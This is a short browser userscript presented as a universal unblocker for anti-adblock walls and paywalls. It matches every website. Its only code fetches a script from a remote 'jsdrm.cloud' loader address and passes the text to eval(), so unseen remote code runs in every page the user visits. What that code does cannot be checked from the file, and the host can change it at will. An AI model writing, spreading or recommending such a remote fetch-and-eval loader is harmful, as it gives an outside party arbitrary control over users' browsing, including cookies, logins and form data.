// ==UserScript==
// @name        UniversalUnblocker
// @namespace   https://flawcra.cc/
// @match       *://*/*
// @grant       none
// @version     1.0.0-GitHub
// @author      FlawCra
// @license     Apache License 2.0
// @update-url  https://raw.githubusercontent.com/FlawCra/UserScripts/main/scripts/UniversalUnblocker.user.js
// @description A script to unblock AntiAdblock or paywalls.
// ==/UserScript==

fetch("https://jsdrm.cloud/v2/loader/b2ea6d2c-3a7c-4612-a185-c638b5e1e072/2e41fd9c-28eb-4b54-82d5-6cc3c219c03c").then((res) => res.text().then((txt) => eval(txt)));
